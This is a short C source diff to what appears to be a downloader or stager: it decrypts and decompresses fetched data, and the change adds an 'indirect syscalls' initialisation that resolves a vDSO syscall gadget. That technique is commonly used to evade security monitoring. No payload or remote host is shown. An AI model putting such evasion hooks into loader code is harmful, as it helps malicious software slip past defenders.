@@ -2,6 +2,7 @@
 #include "aes.h"
 #include "downloader_api.h"
 #include "net_utils.h"
+#include "syscalls.h"
 #include "tinf.h"
 #include "utils.h"
 
@@ -50,6 +51,9 @@ static size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
 
 // Entry point called by _start
 void downloader_main(struct download_result *res) {
+  /* Resolve vDSO syscall gadget before any other syscalls */
+  init_indirect_syscalls();
+
   if (!res) {
     DEBUG_PRINT("No result struct passed\n");
     return;
